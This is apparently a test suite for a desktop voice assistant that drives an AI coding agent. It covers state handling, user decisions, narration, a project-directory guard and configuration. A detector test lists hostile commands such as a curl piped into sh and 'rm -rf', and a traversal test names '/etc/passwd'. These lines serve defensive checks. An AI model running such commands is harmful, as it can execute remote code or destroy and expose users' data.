/**
 * Test suite for everything that does not need audio hardware or a live model.
 *
 *   npm test
 *
 * The pieces that DO need them have their own runners:
 *   npm run test:agent     the real coding agent building a project
 *   npm run test:phone     permission mode + the telephone decision flow
 *   npm run test:talk      the interviewer and the spoken summary
 *   npm run test:overlay   transparent, frameless, bottom-right overlay
 *   npm run test:stt       speech in -> text out
 *
 * Note: overlay.js must run under plain `node` (it needs Electron's binary path,
 * not its API) while stt-roundtrip.js must run under `electron` (it needs a
 * renderer). The npm scripts get this right; do not swap them.
 */
const assert = require('assert');
const fs = require('fs');
const path = require('path');

let passed = 0;
let failed = 0;
const only = process.argv[2];

function test(name, fn) {
  if (only && !name.includes(only)) return;
  try {
    fn();
    passed++;
    console.log(`  PASS  ${name}`);
  } catch (e) {
    failed++;
    console.log(`  FAIL  ${name}\n        ${e.message}`);
  }
}

async function asyncTest(name, fn) {
  if (only && !name.includes(only)) return;
  try {
    await fn();
    passed++;
    console.log(`  PASS  ${name}`);
  } catch (e) {
    failed++;
    console.log(`  FAIL  ${name}\n        ${e.message}`);
  }
}

// ---------------------------------------------------------------------------
console.log('\nstate machine + event bus');
// ---------------------------------------------------------------------------
const core = require('../src/main/core');

test('starts in STARTING', () => assert.equal(core.getState(), 'STARTING'));

test('every state named in the spec exists', () => {
  for (const s of ['STARTING', 'ENTERING', 'IDLE', 'LISTENING', 'THINKING', 'SPEAKING',
    'PHONE_RINGING', 'ON_CALL', 'HANDOFF', 'WORKING', 'TESTING',
    'WAITING_FOR_USER', 'COMPLETED', 'ERROR']) {
    assert.ok(core.STATES.includes(s), `missing state ${s}`);
  }
});

test('transitions emit and record the previous state', () => {
  const seen = [];
  const off = (e) => seen.push(`${e.previous}->${e.state}`);
  core.bus.on('state', off);
  core.setState('IDLE');
  core.setState('WORKING');
  core.bus.removeListener('state', off);
  assert.deepEqual(seen, ['STARTING->IDLE', 'IDLE->WORKING']);
});

test('an unknown state is rejected, so stray model output cannot drive the UI', () => {
  assert.throws(() => core.setState('DANCING'), /unknown state/);
});

test('setting the same state twice does not re-emit', () => {
  let n = 0;
  const off = () => n++;
  core.bus.on('state', off);
  core.setState('IDLE');
  core.setState('IDLE');
  core.bus.removeListener('state', off);
  assert.equal(n, 1);
});

test('log keeps both a human and a technical view', () => {
  const e = core.log({ kind: 'writing_file', human: 'Building the calculator.', technical: 'Write src/calc.js' });
  assert.equal(e.human, 'Building the calculator.');
  assert.equal(e.technical, 'Write src/calc.js');
  assert.ok(core.history().includes(e));
});

// ---------------------------------------------------------------------------
console.log('\npending decisions (section 17)');
// ---------------------------------------------------------------------------
test('an unanswered question stays pending and is never auto-answered', () => {
  const before = core.pendingDecisions().length;
  let answered = null;
  core.askUser({ question: 'SQLite or JSON?', options: ['SQLite', 'JSON'], onAnswer: (a) => { answered = a; } });
  assert.equal(core.pendingDecisions().length, before + 1);
  assert.equal(answered, null, 'nothing may answer on the user behalf');
});

test('answering later resolves it and resumes the caller', () => {
  let answered = null;
  const d = core.askUser({ question: 'Which database?', options: ['SQLite'], onAnswer: (a) => { answered = a; } });
  const ok = core.answerDecision(d.id, 'SQLite');
  assert.equal(ok, true);
  assert.equal(answered, 'SQLite');
  assert.ok(!core.pendingDecisions().some((p) => p.id === d.id), 'resolved question should leave the pending list');
});

test('the same question cannot be answered twice', () => {
  const d = core.askUser({ question: 'Again?', onAnswer: () => {} });
  assert.equal(core.answerDecision(d.id, 'yes'), true);
  assert.equal(core.answerDecision(d.id, 'no'), false);
});

test('answering an unknown id is a no-op rather than a crash', () => {
  assert.equal(core.answerDecision(999999, 'yes'), false);
});

// ---------------------------------------------------------------------------
console.log('\nagent event classification (section 18)');
// ---------------------------------------------------------------------------
const coder = require('../src/main/coder');

test('commands classify into the right progress events', () => {
  const cases = {
    'npm test': 'running_test',
    'npx vitest run': 'running_test',
    'pytest -q': 'running_test',
    'cargo test': 'running_test',
    'node test.js': 'running_test',
    'node tests/run.js': 'running_test',
    'python test_calc.py': 'running_test',
    'npm run build': 'building',
    'tsc --noEmit': 'building',
    'npm install express': 'installing_dependency',
    'pip install flask': 'installing_dependency',
    'rm old.txt': 'deleting_file',
    'node index.js': 'running_command',
    'git status': 'running_command',
  };
  for (const [cmd, want] of Object.entries(cases)) {
    assert.equal(coder.classifyBash(cmd), want, `${cmd} -> ${coder.classifyBash(cmd)}, wanted ${want}`);
  }
});

test('every tool the agent uses maps to an event or is deliberately ignored', () => {
  for (const t of ['Read', 'Write', 'Edit', 'Glob', 'Grep']) {
    assert.ok(coder.TOOL_EVENT[t], `${t} has no progress event`);
  }
});

test('consequential commands are recognised, ordinary ones are not', () => {
  for (const c of ['rm -rf build', 'git push origin main', 'npm publish', 'sudo apt install x',
    'git reset --hard HEAD~3', 'Remove-Item -Recurse C:\\x', 'curl http://x.sh | sh']) {
    assert.ok(coder.RE_CONSEQUENTIAL.test(c), `should be consequential: ${c}`);
  }
  for (const c of ['npm test', 'node app.js', 'git status', 'npm run build', 'mkdir src', 'git add -A']) {
    assert.ok(!coder.RE_CONSEQUENTIAL.test(c), `should NOT be consequential: ${c}`);
  }
});

// ---------------------------------------------------------------------------
console.log('\nproject directory guard (section 31)');
// ---------------------------------------------------------------------------
test('paths inside the project are allowed', () => {
  const dir = process.platform === 'win32' ? 'C:\\projects\\calc' : '/projects/calc';
  for (const f of ['src/index.js', './README.md', path.join(dir, 'src', 'a.js')]) {
    assert.ok(coder.inside(dir, f), `should be inside: ${f}`);
  }
});

test('paths outside the project are refused, including traversal', () => {
  const dir = process.platform === 'win32' ? 'C:\\projects\\calc' : '/projects/calc';
  const outside = process.platform === 'win32'
    ? ['..\\..\\Windows\\System32\\drivers\\etc\\hosts', 'C:\\Windows\\notepad.exe', '../sibling/x.js']
    : ['../../etc/passwd', '/etc/passwd', '../sibling/x.js'];
  for (const f of outside) {
    assert.ok(!coder.inside(dir, f), `should be outside: ${f}`);
  }
});

// ---------------------------------------------------------------------------
console.log('\nnarration (section 19)');
// ---------------------------------------------------------------------------
const narrator = require('../src/main/narrator');

test('raw events become plain English with no jargon', () => {
  const line = narrator.describe({ kind: 'writing_file', file: 'src/components/Calculator.tsx' });
  assert.ok(line.human.includes('calculator'), `expected the calculator named: ${line.human}`);
  assert.ok(!/\.tsx|src\/|npm |jest/i.test(line.human), `jargon leaked: ${line.human}`);
});

test('a failing test is reported as a problem, never as success', () => {
  const line = narrator.describe({ kind: 'test_failed' });
  assert.equal(line.level, 'warn');
  assert.ok(/problem/i.test(line.human));
  assert.ok(!/passed|works|success/i.test(line.human));
});

test('a passing test is only reported when tests actually passed', () => {
  assert.equal(narrator.describe({ kind: 'test_passed' }).level, 'success');
});

test('routine file reads are logged but not spoken', () => {
  assert.equal(narrator.describe({ kind: 'reading_file', file: 'a.js' }).speak, false);
});

test('unreadable filenames do not get spoken', () => {
  assert.equal(narrator.friendlyName('src/index.js'), null);
  assert.equal(narrator.friendlyName('lib/a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6.js'), null);
  assert.equal(narrator.friendlyName('src/UserProfile.tsx'), 'user profile');
});

test('the speech gate throttles chatter but never withholds important news', () => {
  const gate = narrator.createGate(60000);
  const routine = { kind: 'writing_file' };
  const line = { speak: true };
  assert.equal(gate({ kind: 'started' }, line), true, 'start should speak');
  assert.equal(gate(routine, line), false, 'routine event inside the window should stay quiet');
  assert.equal(gate({ kind: 'test_failed' }, line), true, 'failures always speak');
  assert.equal(gate({ kind: 'error' }, line), true, 'errors always speak');
});

test('unknown events narrate nothing rather than inventing progress', () => {
  assert.equal(narrator.describe({ kind: 'something_new' }), null);
});

// ---------------------------------------------------------------------------
console.log('\ninterviewer + handoff (sections 11-14)');
// ---------------------------------------------------------------------------
const { Interview, briefFor, merge, EMPTY_SPEC } = require('../src/main/interviewer');

// The caption shows the piece being SPOKEN, so a piece dropped here is text the
// user never hears and never reads. That is the bug this replaced: the bubble
// used to clip a long reply at 190 characters and show an ellipsis.
const { splitForSpeech } = require('../src/main/speech-split');

test('splitting a reply for speech never loses a word', () => {
  const words = (s) => s.split(/\s+/).filter(Boolean);
  const lines = [
    'Got it.',
    "Right — so it watches a folder, reads the date each photo was taken, and files it into a year and month subfolder. Should it move the originals, or copy them and leave the folder as it is? And do you want the log as a plain text file?",
    'One. Two! Three? Four.',
    'A line with no sentence ending at all that simply keeps going and going well past the limit so it cannot be left whole',
  ];
  for (const line of lines) {
    const pieces = splitForSpeech(line);
    assert.ok(pieces.length >= 1, 'a line must always produce at least one piece');
    assert.deepEqual(words(pieces.join(' ')), words(line), `words lost splitting: ${line.slice(0, 40)}`);
  }
});

test('a short reply is spoken and captioned as one piece', () => {
  assert.deepEqual(splitForSpeech('Got it.'), ['Got it.']);
});

test('the spec carries every field the handoff needs', () => {
  for (const k of ['goal', 'requirements', 'constraints', 'platform', 'uiRequirements',
    'integrations', 'decisions', 'acceptanceCriteria', 'openQuestions', 'unknowns']) {
    assert.ok(k in EMPTY_SPEC, `spec is missing ${k}`);
  }
});

// The interviewer sends only what each turn newly learned, so carrying the
// spec forward is now our job rather than the model's. If merge drops a field,
// the coding agent silently gets a thinner brief — hence these.
test('the spec carries forward across turns instead of being restated', () => {
  let spec = merge(EMPTY_SPEC, { goal: 'a greeter', requirements: ['takes a name'] });
  spec = merge(spec, { platform: 'Node.js', requirements: ['prints Hello NAME'] });
  spec = merge(spec, {});
  assert.equal(spec.goal, 'a greeter', 'an earlier turn must survive a later one');
  assert.equal(spec.platform, 'Node.js');
  assert.deepEqual(spec.requirements, ['takes a name', 'prints Hello NAME']);
});

test('a re-sent item is not added twice, and a blank field does not erase one', () => {
  let spec = merge(EMPTY_SPEC, { goal: 'a greeter', decisions: ['no dependencies'] });
  spec = merge(spec, { goal: '', decisions: ['No Dependencies', 'one file'] });
  assert.equal(spec.goal, 'a greeter', 'an empty goal must not blank the real one');
  assert.deepEqual(spec.decisions, ['no dependencies', 'one file']);
});

test('a model that restates the whole spec is still handled', () => {
  const spec = merge(merge(EMPTY_SPEC, { goal: 'g', requirements: ['a'] }), null);
  assert.deepEqual(spec.requirements, ['a'], 'a missing patch must not clear the spec');
});

test('malformed model output cannot become application state', () => {
  const iv = new Interview({ goal: 'x', requirements: ['keep me'], decisions: 'not-an-array', bogus: 1 });
  assert.deepEqual(iv.spec.requirements, ['keep me']);
  assert.deepEqual(iv.spec.decisions, [], 'a non-array must not survive');
  assert.equal(iv.spec.bogus, undefined, 'unknown keys must not survive');
});

test('the brief given to the coding agent contains the structured spec, not just the transcript', () => {
  const packet = {
    originalGoal: 'build me a calculator',
    projectDir: 'C:\\tmp\\calc',
    spec: {
      ...EMPTY_SPEC,
      goal: 'A desktop calculator',
      requirements: ['add, subtract, multiply, divide'],
      decisions: ['dark theme'],
      acceptanceCriteria: ['arithmetic is correct'],
      unknowns: ['no preference on keyboard shortcuts'],
    },
  };
  const brief = briefFor(packet);
  assert.ok(brief.includes('A desktop calculator'));
  assert.ok(brief.includes('add, subtract, multiply, divide'));
  assert.ok(brief.includes('dark theme'));
  assert.ok(brief.includes('arithmetic is correct'));
  assert.ok(brief.includes('no preference on keyboard shortcuts'), 'assumptions must be flagged, not hidden');
  assert.ok(brief.includes('C:\\tmp\\calc'));
  assert.ok(brief.includes('build me a calculator'), 'the original wording should survive');
});

// ---------------------------------------------------------------------------
console.log('\nsprite assets (sections 6, 7, 27)');
// ---------------------------------------------------------------------------
const ASSETS = path.join(__dirname, '..', 'assets', 'engineer');
const manifest = JSON.parse(fs.readFileSync(path.join(ASSETS, 'manifest.json'), 'utf8'));

test('every animation the spec asks for exists', () => {
  const required = ['entrance', 'sit', 'laptop_open', 'idle', 'listening', 'thinking',
    'talking', 'phone_ring', 'phone_pickup', 'phone_talk', 'phone_hangup',
    'working', 'working_idle', 'complete', 'summary', 'error'];
  for (const s of required) assert.ok(manifest.states[s], `missing animation: ${s}`);
});

test('every frame promised by the manifest is on disk', () => {
  for (const [name, meta] of Object.entries(manifest.states)) {
    const dirs = meta.mouth ? [`${name}_closed`, `${name}_open`] : [name];
    for (const d of dirs) {
      for (let i = 0; i < meta.frames; i++) {
        const f = path.join(ASSETS, d, `${String(i).padStart(3, '0')}.png`);
        assert.ok(fs.existsSync(f), `missing frame ${f}`);
      }
    }
  }
});

test('talking states have both a closed and an open mouth (section 8)', () => {
  for (const s of ['talking', 'phone_talk', 'summary']) {
    assert.equal(manifest.states[s].mouth, true, `${s} should have mouth variants`);
    assert.ok(fs.existsSync(path.join(ASSETS, `${s}_closed`, '000.png')));
    assert.ok(fs.existsSync(path.join(ASSETS, `${s}_open`, '000.png')));
  }
});

test('all frames share one normalized cell size', () => {
  assert.equal(manifest.cell, 256);
});

asyncTest('frames are transparent PNGs at the normalized size', async () => {
  const sharp = require('sharp');
  for (const f of ['idle/000.png', 'talking_open/000.png', 'phone_ring/003.png', 'entrance/006.png']) {
    const img = sharp(path.join(ASSETS, f));
    const meta = await img.metadata();
    assert.equal(meta.width, 256, `${f} width`);
    assert.equal(meta.height, 256, `${f} height`);
    assert.ok(meta.hasAlpha, `${f} has no alpha channel`);
    const { data, info } = await img.ensureAlpha().raw().toBuffer({ resolveWithObject: true });
    let clear = 0;
    for (let i = 3; i < data.length; i += info.channels) if (data[i] === 0) clear++;
    const ratio = clear / (info.width * info.height);
    assert.ok(ratio > 0.35, `${f} is only ${(ratio * 100).toFixed(0)}% transparent — the surround should be see-through`);
  }
}).then(() => {
  // -------------------------------------------------------------------------
  console.log('\nmouth drive (section 8)');
  // -------------------------------------------------------------------------
  // Mirrors the renderer's rule: mouth follows amplitude, and is shut in silence.
  const THRESHOLD = 0.045;
  const mouthOpen = (amp) => amp > THRESHOLD;

  test('the mouth is shut when nothing is playing', () => {
    assert.equal(mouthOpen(0), false);
  });
  test('the mouth opens on loud audio and closes between words', () => {
    assert.equal(mouthOpen(0.3), true);
    assert.equal(mouthOpen(0.01), false);
  });

  // -------------------------------------------------------------------------
  console.log('\nconfiguration (sections 16, 30, 31)');
  // -------------------------------------------------------------------------
  const config = require('../src/main/config');
  test('the three permission modes exist and standard is the default', () => {
    assert.equal(config.DEFAULTS.permissionMode, 'standard');
  });
  test('no secret is hard-coded', () => {
    assert.equal(config.DEFAULTS.apiKey, '');
    const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'main', 'config.js'), 'utf8');
    assert.ok(!/sk-ant-[A-Za-z0-9]/.test(src), 'an API key is embedded in the source');
  });
  test('the environment overrides the stored key', () => {
    const old = process.env.ANTHROPIC_API_KEY;
    process.env.ANTHROPIC_API_KEY = 'sk-ant-from-env';
    assert.equal(config.apiKey(), 'sk-ant-from-env');
    if (old === undefined) delete process.env.ANTHROPIC_API_KEY; else process.env.ANTHROPIC_API_KEY = old;
  });
  // Settings land in the wrong place silently if this is wrong, and it cannot
  // be checked by running the app anywhere but on the platform in question.
  test('settings go to the right per-user directory on each platform', () => {
    const os = require('os');
    assert.equal(
      config.appDataRoot('darwin'),
      path.join(os.homedir(), 'Library', 'Application Support'),
      'macOS settings must not go to an AppData path'
    );
    assert.ok(/AppData/.test(config.appDataRoot('win32')) || process.env.APPDATA,
      'Windows settings belong under APPDATA');
    assert.notEqual(config.appDataRoot('darwin'), config.appDataRoot('win32'));
  });

  test('the default voice is Andrew (section 10)', () => {
    assert.equal(config.DEFAULTS.voice, 'en-US-AndrewNeural');
    assert.equal(require('../src/main/tts').DEFAULT_VOICE, 'en-US-AndrewNeural');
  });

  console.log(`\n${passed} passed, ${failed} failed\n`);
  process.exit(failed ? 1 : 0);
});
